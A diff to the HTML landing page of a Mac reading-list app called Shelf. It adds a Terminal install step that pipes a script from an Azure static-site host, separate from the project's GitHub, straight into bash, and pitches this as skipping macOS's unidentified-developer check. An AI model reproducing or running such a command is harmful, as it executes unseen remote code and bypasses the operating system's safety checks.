@@ -15,14 +15,20 @@
       <h1>A quiet place for what you want to read, watch and remember.</h1>
       <p>Shelf keeps books, films, shows, papers and places in one calm Mac app. Share what you choose with friends; keep the rest to yourself.</p>
       <div class="actions">
-        <a class="pill primary" href="https://github.com/imrajjain/my-home-shelf/releases/latest">Download for Mac</a>
+        <a class="pill primary" href="https://github.com/imrajjain/my-home-shelf/releases/latest/download/Shelf.zip">Download for Mac</a>
+      </div>
+      <div class="install">
+        <p>Or install from Terminal, and skip macOS's “unidentified developer” step:</p>
+        <code>curl -fsSL https://gentle-water-02c5bb500.5.azurestaticapps.net/install.sh | bash</code>
+        <p>With Homebrew:</p>
+        <code>brew install --cask imrajjain/tap/shelf</code>
       </div>
       <form class="find" id="find">
         <input id="name" placeholder="Find someone's shelf by username" autocomplete="off" spellcheck="false">
         <button class="pill secondary" type="submit">Open</button>
       </form>
     </div>
-    <footer>Shelf runs on macOS 14 or later. The first time you open it, right-click ▸ Open, or allow it in System Settings ▸ Privacy &amp; Security.</footer>
+    <footer>Shelf runs on macOS 14 or later and updates itself. If you download it directly, the first time you open it go to System Settings ▸ Privacy &amp; Security and click Open Anyway.</footer>
   </main>
 </body>
 </html>
